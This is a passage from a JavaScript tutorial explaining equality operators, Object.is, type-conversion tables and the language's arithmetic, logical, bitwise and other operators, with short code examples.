3. `Object.is()` (same-value equality)

---

### Strict Equality (`===`)

**No type coercion. Values must be same type AND same value:**

```javascript
// Same type, same value
42 === 42;           // true
"hello" === "hello"; // true
true === true;       // true

// Different types
42 === "42";         // false
true === 1;          // false
null === undefined;  // false

// Special cases
NaN === NaN;         // false (NaN is not equal to itself!)
0 === -0;            // true (signs ignored)

// Objects compared by reference
{} === {};           // false (different objects)
[] === [];           // false

let obj = {};
obj === obj;         // true (same reference)
```

**Rules:**

1. Different types â†’ `false`
2. Same type, same value â†’ `true`
3. `NaN` â†’ always `false` (even `NaN === NaN`)
4. Objects â†’ `true` only if same reference

---

### Loose Equality (`==`)

**Performs type coercion before comparison:**

```javascript
// Same type (acts like ===)
42 == 42;            // true
"hello" == "hello";  // true

// Type coercion
42 == "42";          // true ("42" â†’ 42)
1 == true;           // true (true â†’ 1)
0 == false;          // true (false â†’ 0)
null == undefined;   // true (special case)

// Common surprises
"" == 0;             // true ("" â†’ 0)
"0" == 0;            // true ("0" â†’ 0)
false == "0";        // true (false â†’ 0, "0" â†’ 0)
[] == false;         // true ([] â†’ "" â†’ 0, false â†’ 0)
[] == 0;             // true ([] â†’ "" â†’ 0)
[] == "";            // true ([] â†’ "")
```

---

### Loose Equality Algorithm (Abstract Equality)

When comparing `x == y`:

1. **Same type:** Return `x === y`
    
2. **`null == undefined`:** Return `true`
    
3. **Number vs String:**
    
    - Convert string to number
    - Compare
4. **Boolean vs anything:**
    
    - Convert boolean to number (true â†’ 1, false â†’ 0)
    - Compare
5. **Object vs Primitive:**
    
    - Convert object to primitive (ToPrimitive)
    - Compare
6. **Otherwise:** Return `false`
    

---

### Dangerous `==` Examples

```javascript
// These all return true
"" == 0;             // "" â†’ 0
"0" == 0;            // "0" â†’ 0
false == "0";        // false â†’ 0, "0" â†’ 0
false == "";         // false â†’ 0, "" â†’ 0
false == [];         // false â†’ 0, [] â†’ "" â†’ 0
[] == ![];           // [] â†’ "", ![] â†’ false â†’ 0
[null] == "";        // [null] â†’ "", "" â†’ ""
[undefined] == "";   // [undefined] â†’ "", "" â†’ ""
[[]] == "";          // [[]] â†’ "", "" â†’ ""

// But
"0" == false;        // true
"0" == 0;            // true
0 == false;          // true
// Transitivity broken: "0" == false == 0, but "0" != 0 with some paths!
```

---

### `null` and `undefined` with `==`

**Special rule:** `null == undefined` (and vice versa):

```javascript
null == undefined;   // true
null === undefined;  // false

null == null;        // true
undefined == undefined;  // true

// But not with other falsy values
null == false;       // false
null == 0;           // false
null == "";          // false
undefined == false;  // false
undefined == 0;      // false
undefined == "";     // false
```

**Use case: Check for null or undefined:**

```javascript
if (value == null) {
  // Matches both null and undefined
}

// Equivalent to
if (value === null || value === undefined) {
  // More explicit
}
```

---

### Object Equality

**Both `==` and `===` compare references:**

```javascript
let obj1 = { a: 1 };
let obj2 = { a: 1 };
let obj3 = obj1;

obj1 == obj2;        // false (different objects)
obj1 === obj2;       // false
obj1 == obj3;        // true (same reference)
obj1 === obj3;       // true

[] == [];            // false
[1] == [1];          // false
```

**Comparing to primitive:**

```javascript
// Object coerces to primitive
let obj = { valueOf() { return 42; } };
obj == 42;           // true (obj â†’ 42)
obj === 42;          // false (different types)

[1] == 1;            // true ([1] â†’ "1" â†’ 1)
[1,2] == "1,2";      // true ([1,2] â†’ "1,2")
```

---

### `Object.is()`

**Same-value equality (ES6):**

```javascript
Object.is(42, 42);           // true
Object.is("hello", "hello"); // true

// Fixes NaN
Object.is(NaN, NaN);         // true (unlike ===)

// Distinguishes +0 and -0
Object.is(0, -0);            // false (unlike ===)
Object.is(0, 0);             // true
Object.is(-0, -0);           // true

// Otherwise same as ===
Object.is(null, undefined);  // false
Object.is(42, "42");         // false
```

**Comparison:**

|Expression|`==`|`===`|`Object.is()`|
|---|---|---|---|
|`42 == 42`|true|true|true|
|`42 == "42"`|true|false|false|
|`NaN == NaN`|false|false|**true**|
|`0 == -0`|true|true|**false**|
|`null == undefined`|true|false|false|

---

### Polyfill for `Object.is()`

```javascript
if (!Object.is) {
  Object.is = function(x, y) {
    // SameValue algorithm
    if (x === y) {
      // Handle 0 === -0 case
      return x !== 0 || 1 / x === 1 / y;
    } else {
      // Handle NaN case
      return x !== x && y !== y;
    }
  };
}
```

---

### Equality Best Practices

**Prefer `===`:**

```javascript
// Always use === by default
if (value === 42) { }
if (typeof value === "string") { }
```

**Only use `==` for `null`/`undefined` check:**

```javascript
// Check for null or undefined
if (value == null) {
  // Only case where == is preferable
}

// Otherwise use ===
if (value === null || value === undefined) {
  // More explicit, but verbose
}
```

**Use `Object.is()` for NaN and -0:**

```javascript
// Checking for NaN
if (Object.is(value, NaN)) {
  // Or use Number.isNaN(value)
}

// Distinguishing +0 and -0
if (Object.is(value, -0)) {
  // Rare, but correct
}
```

**Never rely on `==` coercion:**

```javascript
// Bad
if (value == true) { }

// Good
if (value === true) { }
if (value) { }  // Truthy check
```

---

### 1.4.7 Type Conversion Cheatsheet

### To String

|Value|String()|toString()|+ ""|
|---|---|---|---|
|`undefined`|"undefined"|TypeError|"undefined"|
|`null`|"null"|TypeError|"null"|
|`true`|"true"|"true"|"true"|
|`false`|"false"|"false"|"false"|
|`42`|"42"|"42"|"42"|
|`NaN`|"NaN"|"NaN"|"NaN"|
|`Infinity`|"Infinity"|"Infinity"|"Infinity"|
|`""`|""|""|""|
|`[]`|""|""|""|
|`[1,2]`|"1,2"|"1,2"|"1,2"|
|`{}`|"[object Object]"|"[object Object]"|"[object Object]"|

---

### To Number

|Value|Number()|+value|parseInt()|
|---|---|---|---|
|`undefined`|NaN|NaN|NaN|
|`null`|0|0|NaN|
|`true`|1|1|NaN|
|`false`|0|0|NaN|
|`""`|0|0|NaN|
|`" "`|0|0|NaN|
|`"42"`|42|42|42|
|`"42px"`|NaN|NaN|42|
|`"hello"`|NaN|NaN|NaN|
|`[]`|0|0|NaN|
|`[5]`|5|5|5|
|`[1,2]`|NaN|NaN|1|
|`{}`|NaN|NaN|NaN|

---

### To Boolean

|Value|Boolean()|!!value|if (value)|
|---|---|---|---|
|`false`|false|false|false|
|`0`|false|false|false|
|`-0`|false|false|false|
|`0n`|false|false|false|
|`""`|false|false|false|
|`null`|false|false|false|
|`undefined`|false|false|false|
|`NaN`|false|false|false|
|`true`|true|true|true|
|`1`|true|true|true|
|`"0"`|true|true|true|
|`"false"`|true|true|true|
|`[]`|true|true|true|
|`{}`|true|true|true|
|`function(){}`|true|true|true|

---

### 1.4.8 Summary

### Type Checking

**`typeof`:**

- Returns string type name
- 8 possible values
- Safe for undeclared variables (except TDZ)
- Bug: `typeof null === "object"`
- Cannot distinguish arrays/objects

**`instanceof`:**

- Checks prototype chain
- Fails for primitives
- Fails cross-realm
- Can be customized with `Symbol.hasInstance`

---

### Type Coercion vs Conversion

**Coercion (implicit):**

- Automatic by JavaScript
- Triggered by operators and contexts
- Often surprising and bug-prone

**Conversion (explicit):**

- Manual by developer
- Use constructors or functions
- More predictable and readable

---

### Equality Operators

|Operator|Coercion|NaN === NaN|0 === -0|null == undefined|Use Case|
|---|---|---|---|---|---|
|`==`|Yes|false|true|**true**|Only for null/undefined check|
|`===`|No|false|true|false|Default choice|
|`Object.is()`|No|**true**|**false**|false|NaN and -0 checks|

---

### Best Practices

1. **Always use `===`** unless you have a specific reason for `==`
2. **Only use `==` for `null`/`undefined` checks**
3. **Use `Number.isNaN()` for NaN checks** (not `=== NaN`)
4. **Use `Array.isArray()` for array checks** (not `instanceof`)
5. **Avoid relying on type coercion**â€”be explicit
6. **Use linters** to catch `==` usage
7. **Understand truthiness** but don't abuse it
8. **Be explicit with conversions**: `String()`, `Number()`, `Boolean()`

---

## 1.5 Operators

### 1.5.1 Arithmetic Operators

### Basic Arithmetic

**Addition (`+`):**

```javascript
5 + 3;        // 8
1.5 + 2.5;    // 4
-5 + 10;      // 5

// String concatenation (if either operand is string)
"hello" + " world";  // "hello world"
"5" + 3;             // "53" (number coerced to string)
5 + "3";             // "53"
```

**Subtraction (`-`):**

```javascript
10 - 5;       // 5
5 - 10;       // -5
1.5 - 0.5;    // 1

// Always converts to number
"10" - 5;     // 5
"10" - "5";   // 5
10 - "abc";   // NaN
```

**Multiplication (`*`):**

```javascript
5 * 3;        // 15
2.5 * 4;      // 10
-5 * 2;       // -10

// Numeric coercion
"5" * "3";    // 15
"5" * 2;      // 10
5 * "abc";    // NaN
```

**Division (`/`):**

```javascript
10 / 2;       // 5
10 / 3;       // 3.3333333333333335
10 / 0;       // Infinity
-10 / 0;      // -Infinity
0 / 0;        // NaN

// Numeric coercion
"10" / "2";   // 5
"10" / 2;     // 5
```

**Remainder/Modulo (`%`):**

```javascript
10 % 3;       // 1
10 % 5;       // 0
10 % 4;       // 2
-10 % 3;      // -1 (sign follows dividend)
10 % -3;      // 1

// Numeric coercion
"10" % 3;     // 1
10 % "3";     // 1

// Floating-point remainder
5.5 % 2;      // 1.5
```

**Exponentiation (`**`):**

```javascript
2 ** 3;       // 8 (2^3)
2 ** 10;      // 1024
3 ** 2;       // 9
5 ** 0;       // 1
2 ** -1;      // 0.5

// Numeric coercion
"2" ** "3";   // 8

// Right-associative
2 ** 3 ** 2;  // 512 (2^(3^2) = 2^9)
```

**Precedence:**

```javascript
2 + 3 * 4;           // 14 (multiplication first)
(2 + 3) * 4;         // 20 (parentheses override)
2 ** 3 * 4;          // 32 (exponentiation first)
2 + 3 ** 2;          // 11 (exponentiation first)
```

---

### Unary Arithmetic Operators

**Unary Plus (`+`):**

Converts operand to number:

```javascript
+5;           // 5
+"5";         // 5 (string to number)
+true;        // 1
+false;       // 0
+null;        // 0
+undefined;   // NaN
+"";          // 0
+"abc";       // NaN
+[];          // 0
+[5];         // 5
+{};          // NaN
```

**Unary Minus (`-`):**

Negates and converts to number:

```javascript
-5;           // -5
-"5";         // -5
-true;        // -1
-false;       // -0
-null;        // -0
```

**Increment (`++`):**

Pre-increment and post-increment:

```javascript
let x = 5;

// Post-increment (returns old value, then increments)
let y = x++;
console.log(y);  // 5
console.log(x);  // 6

// Pre-increment (increments, then returns new value)
let z = ++x;
console.log(z);  // 7
console.log(x);  // 7
```

**Decrement (`--`):**

Pre-decrement and post-decrement:

```javascript
let x = 5;

// Post-decrement
let y = x--;
console.log(y);  // 5
console.log(x);  // 4

// Pre-decrement
let z = --x;
console.log(z);  // 3
console.log(x);  // 3
```

**Increment/Decrement behavior:**

```javascript
let x = "5";
x++;           // x is now 6 (string converted to number)

let y = "abc";
y++;           // y is now NaN

let z;
z++;           // z is now NaN (undefined â†’ NaN)

let obj = { valueOf: () => 10 };
obj++;         // 10 â†’ 11 (calls valueOf)
```

**Cannot increment/decrement literals or expressions:**

```javascript
5++;           // SyntaxError
(x + y)++;     // SyntaxError

// Must assign to variable first
let result = x + y;
result++;
```

---

### Special Arithmetic Cases

**`+` operator ambiguity:**

```javascript
// Addition or concatenation?
1 + 2 + "3";      // "33" (left-to-right: 3 + "3")
"1" + 2 + 3;      // "123" (left-to-right: "1" + 2, then + 3)
1 + 2 + 3;        // 6

// Force numeric addition
1 + 2 + +"3";     // 6 (unary + converts "3" to number)
```

**Division by zero:**

```javascript
1 / 0;            // Infinity
-1 / 0;           // -Infinity
0 / 0;            // NaN
Infinity / Infinity;  // NaN
```

**Infinity arithmetic:**

```javascript
Infinity + Infinity;  // Infinity
Infinity - Infinity;  // NaN
Infinity * Infinity;  // Infinity
Infinity / Infinity;  // NaN
Infinity * 0;         // NaN
Infinity / 0;         // Infinity
```

**NaN propagation:**

```javascript
NaN + 5;          // NaN
NaN - 5;          // NaN
NaN * 5;          // NaN
NaN / 5;          // NaN
NaN % 5;          // NaN
NaN ** 5;         // NaN
```

---

### 1.5.2 Assignment Operators

### Simple Assignment (`=`)

Assigns value to variable:

```javascript
let x = 5;
let y = x;
let z = x = 10;  // Right-associative: x = 10, then z = x

console.log(x);  // 10
console.log(y);  // 5
console.log(z);  // 10
```

**Assignment is an expression (returns assigned value):**

```javascript
let a, b, c;
a = b = c = 10;  // All get 10

if (x = 5) {     // Assignment, not comparison!
  console.log(x);  // 5
}

// Common bug
if (x = y) {     // Should be x === y
  // Always truthy if y is truthy
}
```

---

### Compound Assignment Operators

**Arithmetic assignment:**

```javascript
let x = 10;

x += 5;   // x = x + 5;      â†’ 15
x -= 3;   // x = x - 3;      â†’ 12
x *= 2;   // x = x * 2;      â†’ 24
x /= 4;   // x = x / 4;      â†’ 6
x %= 4;   // x = x % 4;      â†’ 2
x **= 3;  // x = x ** 3;     â†’ 8
```

**With type coercion:**

```javascript
let x = "5";
x += 3;   // "53" (string concatenation)

let y = "10";
y -= 5;   // 5 (numeric subtraction)

let z = "10";
z *= 2;   // 20 (numeric multiplication)
```

**Compound assignment is not exactly equivalent:**

```javascript
// These are NOT identical:
a += b;
a = a + b;

// Why? Evaluation order and side effects
let obj = { x: 10 };
function getObj() {
  console.log("called");
  return obj;
}

// Evaluates getObj() once
getObj().x += 5;  // Logs "called" once

// Evaluates getObj() twice
getObj().x = getObj().x + 5;  // Logs "called" twice
```

---

### Logical Assignment Operators (ES2021)

**Logical AND assignment (`&&=`):**

Assigns only if left side is truthy:

```javascript
let x = 5;
x &&= 10;      // x is truthy, so x = 10

let y = 0;
y &&= 10;      // y is falsy, so no assignment (y remains 0)

// Equivalent to:
x = x && 10;

// Use case: Set default only if exists
let user = { name: "Alice" };
user.name &&= user.name.toUpperCase();  // "ALICE"

let guest = {};
guest.name &&= guest.name.toUpperCase();  // undefined (no error)
```

**Logical OR assignment (`||=`):**

Assigns only if left side is falsy:

```javascript
let x = 5;
x ||= 10;      // x is truthy, so no assignment (x remains 5)

let y = 0;
y ||= 10;      // y is falsy, so y = 10

// Equivalent to:
x = x || 10;

// Use case: Default values
let config = {};
config.timeout ||= 5000;  // Sets timeout to 5000 if not set
```

**Nullish coalescing assignment (`??=`):**

Assigns only if left side is `null` or `undefined`:

```javascript
let x = 5;
x ??= 10;      // x is not nullish, so no assignment (x remains 5)

let y = 0;
y ??= 10;      // y is not nullish (just falsy), so no assignment (y remains 0)

let z = null;
z ??= 10;      // z is nullish, so z = 10

let w;
w ??= 10;      // w is undefined (nullish), so w = 10

// Equivalent to:
x = x ?? 10;

// Use case: Distinguish null/undefined from other falsy values
let count = 0;
count ??= 10;  // count remains 0 (not null/undefined)
```

**Difference between `||=` and `??=`:**

```javascript
let x = 0;
x ||= 10;      // 10 (0 is falsy)
x ??= 10;      // 0 (0 is not nullish)

let y = "";
y ||= "default";   // "default" ("" is falsy)
y ??= "default";   // "" ("" is not nullish)

let z = null;
z ||= "default";   // "default" (null is falsy)
z ??= "default";   // "default" (null is nullish)
```

---

### Short-Circuit Evaluation

Logical assignment operators **short-circuit**:

```javascript
// &&= doesn't evaluate right side if left is falsy
let x = 0;
x &&= expensiveOperation();  // expensiveOperation() NOT called

// ||= doesn't evaluate right side if left is truthy
let y = 5;
y ||= expensiveOperation();  // expensiveOperation() NOT called

// ??= doesn't evaluate right side if left is not nullish
let z = 0;
z ??= expensiveOperation();  // expensiveOperation() NOT called
```

---

### 1.5.3 Comparison Operators

### Equality Operators

**Strict equality (`===`):**

```javascript
5 === 5;           // true
5 === "5";         // false (different types)
true === 1;        // false
null === undefined;// false
NaN === NaN;       // false
0 === -0;          // true

{} === {};         // false (different objects)
[] === [];         // false
```

**Strict inequality (`!==`):**

```javascript
5 !== 3;           // true
5 !== "5";         // true (different types)
null !== undefined;// true
NaN !== NaN;       // true (NaN is never equal to itself)
```

**Loose equality (`==`):**

```javascript
5 == 5;            // true
5 == "5";          // true (coerces "5" to number)
true == 1;         // true (true â†’ 1)
false == 0;        // true (false â†’ 0)
null == undefined; // true (special case)
"" == 0;           // true ("" â†’ 0)

{} == {};          // false (different objects)
```

**Loose inequality (`!=`):**

```javascript
5 != 3;            // true
5 != "5";          // false (coerces "5" to number)
null != undefined; // false (special case)
```

See Chapter 1.4 for detailed equality behavior.

---

### Relational Operators

**Less than (`<`):**

```javascript
5 < 10;            // true
10 < 5;            // false
5 < 5;             // false

// String comparison (lexicographic)
"a" < "b";         // true
"apple" < "banana";// true
"10" < "9";        // true (string comparison, not numeric!)

// Numeric coercion
"10" < 9;          // false (both converted to numbers)
"10" < "9";        // true (string comparison)
```

**Greater than (`>`):**

```javascript
10 > 5;            // true
5 > 10;            // false
5 > 5;             // false

// String comparison
"b" > "a";         // true
"banana" > "apple";// true
```

**Less than or equal (`<=`):**

```javascript
5 <= 10;           // true
5 <= 5;            // true
10 <= 5;           // false

// NOT equivalent to !(a > b)
NaN <= NaN;        // false
NaN > NaN;         // false
!(NaN > NaN);      // true
```

**Greater than or equal (`>=`):**

```javascript
10 >= 5;           // true
5 >= 5;            // true
5 >= 10;           // false
```

---

### Comparison Type Coercion

**Both operands strings:** Lexicographic comparison:

```javascript
"apple" < "banana";  // true
"10" < "9";          // true (lexicographic, not numeric!)
"2" > "10";          // true (lexicographic)
```

**One or both numbers:** Convert to number:

```javascript
10 < "20";         // true (20 converted to number)
"10" < 20;         // true (10 converted to number)
10 < 20;           // true
```

**Special values:**

```javascript
// NaN comparisons always false
NaN < 5;           // false
NaN > 5;           // false
NaN <= 5;          // false
NaN >= 5;          // false
NaN == NaN;        // false

// null and undefined
null < 1;          // true (null â†’ 0)
undefined < 1;     // false (undefined â†’ NaN)
null == undefined; // true (special case)
null === undefined;// false
```

**Object comparison:**

```javascript
// Objects compared by reference
let obj1 = { x: 5 };
let obj2 = { x: 5 };
let obj3 = obj1;

obj1 < obj2;       // false (convert to primitive first)
obj1 == obj2;      // false (different objects)
obj1 == obj3;      // true (same reference)
```

---

### 1.5.4 Logical Operators

### Logical AND (`&&`)

Returns first falsy value or last value:

```javascript
true && true;         // true
true && false;        // false
false && true;        // false
5 && 3;               // 3 (both truthy, returns last)
0 && 5;               // 0 (first falsy)
5 && 0;               // 0 (second falsy)
null && "hello";      // null (first falsy)
"hello" && "world";   // "world" (both truthy)
```

**Short-circuit evaluation:**

```javascript
false && expensiveOperation();  // expensiveOperation() NOT called

let x = 0;
x && console.log("Not logged");  // Doesn't log

let y = 5;
y && console.log("Logged");      // Logs "Logged"
```

**Common patterns:**

```javascript
// Conditional execution
isValid && processData();

// Safe property access (pre-optional chaining)
user && user.name && user.name.toUpperCase();

// Guard clauses
function divide(a, b) {
  b !== 0 && console.log(a / b);
}
```

---

### Logical OR (`||`)

Returns first truthy value or last value:

```javascript
true || false;        // true
false || true;        // true
5 || 3;               // 5 (first truthy)
0 || 5;               // 5 (second truthy)
0 || null;            // null (both falsy, returns last)
null || undefined;    // undefined (both falsy, returns last)
"hello" || "world";   // "hello" (first truthy)
```

**Short-circuit evaluation:**

```javascript
true || expensiveOperation();  // expensiveOperation() NOT called

let x = 5;
x || console.log("Not logged");  // Doesn't log

let y = 0;
y || console.log("Logged");      // Logs "Logged"
```

**Default values:**

```javascript
let name = userName || "Anonymous";

function greet(greeting) {
  greeting = greeting || "Hello";
  console.log(greeting);
}

// But beware of falsy valid values
let count = userCount || 0;  // Wrong! If userCount is 0, uses 0 default
let count = userCount ?? 0;  // Correct: use nullish coalescing
```

---

### Logical NOT (`!`)

Converts to boolean and negates:

```javascript
!true;            // false
!false;           // true
!0;               // true (0 is falsy)
!1;               // false (1 is truthy)
!"";              // true ("" is falsy)
!"hello";         // false ("hello" is truthy)
!null;            // true
!undefined;       // true
!NaN;             // true
![];              // false (arrays are truthy)
!{};              // false (objects are truthy)
```

**Double negation (convert to boolean):**

```javascript
!!0;              // false
!!1;              // true
!!"";             // false
!!"hello";        // true
!![];             // true
!!{};             // true

// Equivalent to Boolean()
!!value === Boolean(value);
```

---

### Logical Operator Precedence

```javascript
// NOT (!) has highest precedence
!true || false;        // false ((!true) || false)

// AND (&&) has higher precedence than OR (||)
true || false && false;  // true (true || (false && false))
(true || false) && false;// false (override with parentheses)

// Comparison
a < b && b < c;        // Explicit
a < b < c;             // Wrong! (a < b) < c (chaining doesn't work)
```

---

### 1.5.5 Nullish Coalescing Operator (`??`)

Returns right operand when left is `null` or `undefined`:

```javascript
null ?? "default";      // "default"
undefined ?? "default"; // "default"
0 ?? "default";         // 0 (not nullish)
"" ?? "default";        // "" (not nullish)
false ?? "default";     // false (not nullish)
NaN ?? "default";       // NaN (not nullish)

let x;
x ?? 10;                // 10 (undefined is nullish)
```

**Difference from `||`:**

```javascript
// || returns right operand if left is falsy
0 || 10;         // 10
"" || "default"; // "default"
false || true;   // true

// ?? returns right operand only if left is nullish
0 ?? 10;         // 0 (not nullish)
"" ?? "default"; // "" (not nullish)
false ?? true;   // false (not nullish)

null ?? 10;      // 10 (nullish)
undefined ?? 10; // 10 (nullish)
```

**Use cases:**

```javascript
// Config with 0 or "" as valid values
let timeout = config.timeout ?? 5000;  // 0 is valid
let message = config.message ?? "Hello";  // "" is valid

// vs
let timeout = config.timeout || 5000;  // 0 would use default!
```

**Cannot chain with `&&` or `||` without parentheses:**

```javascript
null ?? "default" || "fallback";  // SyntaxError
(null ?? "default") || "fallback";  // OK
null ?? ("default" || "fallback");  // OK
```

---

### 1.5.6 Conditional (Ternary) Operator (`? :`)

Only ternary operator in JavaScript (three operands):

```javascript
condition ? valueIfTrue : valueIfFalse;

// Examples
let age = 20;
let status = age >= 18 ? "adult" : "minor";  // "adult"

let x = 5;
let result = x > 0 ? "positive" : "negative or zero";

// Can be nested (but avoid deep nesting)
let score = 85;
let grade = score >= 90 ? "A" :
            score >= 80 ? "B" :
            score >= 70 ? "C" :
            score >= 60 ? "D" : "F";

// Alternative: use if-else for readability
```

**Short-circuit evaluation:**

```javascript
true ? expensiveOperation() : cheapOperation();
// Only expensiveOperation() called

false ? expensiveOperation() : cheapOperation();
// Only cheapOperation() called
```

**Operator precedence:**

```javascript
// Assignment has lower precedence than ternary
let result = x > 0 ? 1 : 0;  // OK

// But watch out for complex expressions
let result = x > 0 ? y = 1 : y = 0;  // Assignment in ternary
let result = (x > 0 ? y : z) = 1;    // SyntaxError
```

**Common patterns:**

```javascript
// Inline defaults
let name = user.name ? user.name : "Anonymous";
// Better: use ?? or ||
let name = user.name ?? "Anonymous";

// Conditional rendering (React)
{isLoggedIn ? <Dashboard /> : <Login />}

// Conditional method call
array.length > 0 ? array.sort() : null;
```

---

### 1.5.7 Optional Chaining Operator (`?.`)

Safely access nested properties (ES2020):

```javascript
// Old way
let name = user && user.profile && user.profile.name;

// Optional chaining
let name = user?.profile?.name;

// If any part is null/undefined, returns undefined
let name = null?.profile?.name;  // undefined
let name = undefined?.profile?.name;  // undefined
```

**Works with:**

**1. Property access:**

```javascript
obj?.prop;
obj?.[expr];
```

**2. Method calls:**

```javascript
obj?.method();

// Only calls method if obj is not nullish
user?.login();  // Doesn't call if user is null/undefined

// vs
user.login?.();  // Doesn't call if login is null/undefined
```

**3. Array/computed access:**

```javascript
arr?.[0];
obj?.[key];

let arr = null;
arr?.[0];  // undefined (not TypeError)

let obj = null;
obj?.[dynamicKey];  // undefined
```

**Short-circuiting:**

```javascript
// If left side is nullish, right side not evaluated
user?.profile?.logAccess();  // logAccess() not called if user or profile is nullish

// Example
let count = 0;
null?.[count++];  // count remains 0 (right side not evaluated)
```

**Cannot use with assignment:**

```javascript
obj?.prop = value;  // SyntaxError
```

**Combining with nullish coalescing:**

```javascript
let name = user?.profile?.name ?? "Anonymous";

// If any part is nullish, uses "Anonymous"
```

**Difference from `&&`:**

```javascript
// && checks truthiness
0 && console.log("Not logged");  // Doesn't log (0 is falsy)

// ?. checks nullishness
let obj = { value: 0 };
obj?.value && console.log("Not logged");  // Doesn't log (0 is falsy)
obj?.value ?? console.log("Logged");      // Doesn't log (0 is not nullish)
```

---

### 1.5.8 Bitwise Operators

Operate on 32-bit integers (convert operands to 32-bit signed integers):

### Bitwise AND (`&`)

```javascript
5 & 3;   // 1
// 5:  0101
// 3:  0011
// &:  0001 = 1

12 & 10; // 8
// 12: 1100
// 10: 1010
// &:  1000 = 8
```

**Use case: Check if even/odd:**

```javascript
num & 1;  // 1 if odd, 0 if even

5 & 1;    // 1 (odd)
6 & 1;    // 0 (even)
```

### Bitwise OR (`|`)

```javascript
5 | 3;   // 7
// 5:  0101
// 3:  0011
// |:  0111 = 7

12 | 10; // 14
// 12: 1100
// 10: 1010
// |:  1110 = 14
```

**Use case: Truncate to integer:**

```javascript
3.14 | 0;  // 3 (truncates decimal)
-3.14 | 0; // -3
```

### Bitwise XOR (`^`)

```javascript
5 ^ 3;   // 6
// 5:  0101
// 3:  0011
// ^:  0110 = 6

12 ^ 10; // 6
// 12: 1100
// 10: 1010
// ^:  0110 = 6
```

**Use case: Toggle bits:**

```javascript
let flags = 0b1010;
flags ^= 0b0100;  // Toggle bit at position 2
```

**Use case: Swap without temp variable:**

```javascript
let a = 5, b = 3;
a ^= b;
b ^= a;
a ^= b;
console.log(a, b);  // 3, 5
```

### Bitwise NOT (`~`)

```javascript
~5;      // -6
// 5:   00000000000000000000000000000101
// ~5:  11111111111111111111111111111010 = -6 (two's complement)

~-1;     // 0
~0;      // -1
```

**Formula:** `~n === -(n + 1)`

**Use case: indexOf check (old pattern):**

```javascript
// Old way to check if found
if (~str.indexOf("hello")) {
  // Found (-1 â†’ 0, anything else â†’ non-zero)
}

// Modern way (use includes)
if (str.includes("hello")) { }
```

### Left Shift (`<<`)

```javascript
5 << 1;  // 10
// 5:  00000101
// <<1: 00001010 = 10

5 << 2;  // 20 (multiply by 2^2 = 4)
5 << 3;  // 40 (multiply by 2^3 = 8)
```

**Formula:** `n << m` === `n * 2^m`

### Sign-Propagating Right Shift (`>>`)

```javascript
20 >> 1;  // 10
// 20:  00010100
// >>1: 00001010 = 10

20 >> 2;  // 5 (divide by 2^2 = 4)

-20 >> 2; // -5 (sign bit preserved)
```

**Formula:** `n >> m` â‰ˆ `Math.floor(n / 2^m)` (for positive)

### Zero-Fill Right Shift (`>>>`)

```javascript
20 >>> 1;  // 10
-20 >>> 1; // 2147483638 (no sign preservation)

// -20: 11111111111111111111111111101100
// >>>1: 01111111111111111111111111110110 = 2147483638
```

**Use case: Convert to unsigned 32-bit integer:**

```javascript
-1 >>> 0;  // 4294967295 (unsigned 32-bit max)
```

---

### Bitwise Assignment Operators

```javascript
let x = 5;
x &= 3;   // x = x & 3
x |= 3;   // x = x | 3
x ^= 3;   // x = x ^ 3
x <<= 2;  // x = x << 2
x >>= 2;  // x = x >> 2
x >>>= 2; // x = x >>> 2
```

---

### Bitwise Operators with Non-Integers

**Convert to 32-bit signed integer first:**

```javascript
3.14 & 5;     // 1 (3.14 â†’ 3)
3.9 | 0;      // 3 (truncate to integer)
"5" & 3;      // 1 ("5" â†’ 5)
true & 1;     // 1 (true â†’ 1)
```

---

### 1.5.9 Other Operators

### Comma Operator (`,`)

Evaluates each operand left-to-right, returns last:

```javascript
let x = (1, 2, 3);  // x = 3

let a = 1, b = 2, c = 3;  // Variable declarations (not comma operator)

// In expressions
let result = (a++, b++, c++);  // Evaluates all, returns c++
```

**Use case: For loop:**

```javascript
for (let i = 0, j = 10; i < j; i++, j--) {
  console.log(i, j);
}
```

**Use case: Compact expressions:**

```javascript
// Return from function and log
return (console.log("Returning"), value);

// Multiple statements in arrow function
const fn = () => (sideEffect(), returnValue);
```

---

### `typeof` Operator

See Chapter 1.4 for details:

```javascript
typeof 42;           // "number"
typeof "hello";      // "string"
typeof true;         // "boolean"
typeof undefined;    // "undefined"
typeof null;         // "object" (bug)
typeof {};           // "object"
typeof [];           // "object"
typeof function(){}; // "function"
typeof Symbol();     // "symbol"
typeof 123n;         // "bigint"
```

---

### `instanceof` Operator

See Chapter 1.4 for details:

```javascript
[] instanceof Array;        // true
{} instanceof Object;       // true
new Date() instanceof Date; // true
"hello" instanceof String;  // false (primitive)
```

---

### `in` Operator

Check if property exists in object (including prototype chain):

```javascript
let obj = { x: 1, y: 2 };

"x" in obj;          // true
"z" in obj;          // false
"toString" in obj;   // true (inherited from Object.prototype)

// Arrays
let arr = [1, 2, 3];
0 in arr;            // true
3 in arr;            // false
"length" in arr;     // true

// Check for own property
obj.hasOwnProperty("x");  // true
obj.hasOwnProperty("toString");  // false (inherited)
```

**With optional chaining:**

```javascript
"prop" in obj?.nested;  // Safe check
```

---

### `delete` Operator

Delete property from object:

```javascript
let obj = { x: 1, y: 2 };

delete obj.x;     // true (deleted)
console.log(obj); // { y: 2 }

delete obj.z;     // true (property doesn't exist, still returns true)
```

**Cannot delete:**

```javascript
let x = 5;
delete x;         // false (cannot delete variables)

delete Math.PI;   // false (cannot delete non-configurable properties)

function f() {}
delete f;         // false (cannot delete functions)
```

**Arrays:**

```javascript
let arr = [1, 2, 3];
delete arr[1];    // true
console.log(arr); // [1, empty, 3] (creates hole)
console.log(arr.length); // 3 (length unchanged)

// Better: use splice
arr.splice(1, 1); // [1, 3]
```

**Strict mode:**

```javascript
"use strict";
let x = 5;
delete x;  // SyntaxError
```

---

### `void` Operator

Evaluates expression and returns `undefined`:

```javascript
void 0;           // undefined
void (1 + 2);     // undefined
void anyExpression;  // undefined
```

**Use case: Ensure undefined:**

```javascript
// Safe undefined (can't be shadowed)
let x = void 0;

// vs
let x = undefined;  // Can be shadowed in local scope
```

**Use case: IIFE:**

```javascript
void function() {
  console.log("IIFE");
}();
```

**Use case: Prevent default in href:**

```html
<a href="javascript:void(0)">Click</a>
```

---

### Spread Operator (`...`)

**Arrays:**

```javascript
let arr = [1, 2, 3];
let arr2 = [...arr];       // Copy array
let arr3 = [...arr, 4, 5]; // [1, 2, 3, 4, 5]

// Merge arrays
let merged = [...arr1, ...arr2];

// Function arguments
Math.max(...arr);  // Math.max(1, 2, 3)
```

**Objects (ES2018):**

```javascript
let obj = { x: 1, y: 2 };
let obj2 = { ...obj };         // Copy object
